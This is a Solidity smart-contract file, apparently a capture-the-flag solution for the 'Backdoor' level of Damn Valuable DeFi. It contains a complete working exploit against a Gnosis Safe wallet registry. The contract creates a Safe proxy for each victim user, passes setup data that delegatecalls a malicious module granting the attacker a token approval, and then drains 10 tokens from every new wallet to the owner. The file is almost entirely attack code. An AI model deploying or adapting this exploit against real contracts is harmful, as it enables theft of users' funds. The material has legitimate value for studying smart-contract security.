import "@gnosis.pm/safe-contracts/contracts/common/Enum.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";


import "../DamnValuableToken.sol";

contract AttackBackdoor {
    address public owner;
    address public factory;
    address public masterCopy;
    address public walletRegistry;
    address public token;

    constructor(
        address _owner,
        address _factory,
        address _masterCopy,
        address _walletRegistry,
        address _token,
        address[] memory users
    ) {
        // Setup vars
        owner = _owner;
        factory = _factory;
        masterCopy = _masterCopy;
        walletRegistry = _walletRegistry;
        token = _token;

        // Deploy module contract (this is required as it will be delegate called
        // so we cannot call the token contract directly.)
        AttackBackdoorModule abm = new AttackBackdoorModule();

        // Setup module setup data
        string memory setupTokenSignature = "approve(address,address,uint256)";
        bytes memory setupData = abi.encodeWithSignature(
            setupTokenSignature,
            address(this),
            address(token),
            10 ether
            );

        // Loop each user
        for (uint256 i = 0; i < users.length; i++) {
            // Need to create a dynamically sized array for the user to meet signature req's
            address user = users[i];
            address[] memory victim = new address[](1);
            victim[0] = user;

            // Create ABI call for proxy
            string
                memory signatureString = "setup(address[],uint256,address,bytes,address,address,uint256,address)";
            bytes memory initGnosis = abi.encodeWithSignature(
                signatureString,
                victim,
                uint256(1),
                address(abm),
                setupData,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );
            
            // Deploy the proxy with all the exploit data in initGnosis
            GnosisSafeProxy newProxy = GnosisSafeProxyFactory(factory)
                .createProxyWithCallback(
                    masterCopy,
                    initGnosis,
                    123,
                    IProxyCreationCallback(walletRegistry)
                );

            // Proxy has approved this contract for transfer in the
            // module setup so we should be able to transfer some ETH
            DamnValuableToken(token).transferFrom(
                address(newProxy),
                owner,
                10 ether
            );
        }
    }
}

// Backdoor module contract that has to be deployed seperately so 
// 1. It is able to called since the above contract's constructor is not complete
// 2. It is delegate called so we cannot call the token approval directly.
contract AttackBackdoorModule {
    function approve(address approvalAddress, address token, uint256 amount) public {
        DamnValuableToken(token).approve(approvalAddress, amount);
    }
}